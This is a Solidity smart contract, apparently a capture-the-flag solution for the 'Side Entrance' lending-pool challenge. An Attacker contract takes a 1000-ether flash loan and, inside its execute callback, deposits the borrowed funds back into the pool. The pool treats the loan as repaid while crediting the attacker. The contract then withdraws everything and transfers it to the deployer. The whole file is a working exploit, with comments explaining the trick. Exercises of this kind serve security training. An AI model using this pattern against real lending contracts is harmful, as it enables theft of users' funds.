// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Attacker {
    using Address for address payable;

    address poolAddress;
    address payable attacker;

    constructor(address _pool) {
        poolAddress = _pool;
        attacker = payable(msg.sender);
    }

    // execute will receive the eth and on receiving
    // will then deposit in our account so we dont crash unpaid flashloan
    function execute() external payable {
        ISideEntranceLenderPool pool = ISideEntranceLenderPool(poolAddress);
        pool.deposit{value: msg.value}();
    }

    // this will ask for the flashloan and will flashLoan function
    // in return will call execute of our Attacker contract
    function hitFlashLoan() external {
        ISideEntranceLenderPool pool = ISideEntranceLenderPool(poolAddress);
        pool.flashLoan(1000 ether);

        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    receive() external payable {}
}
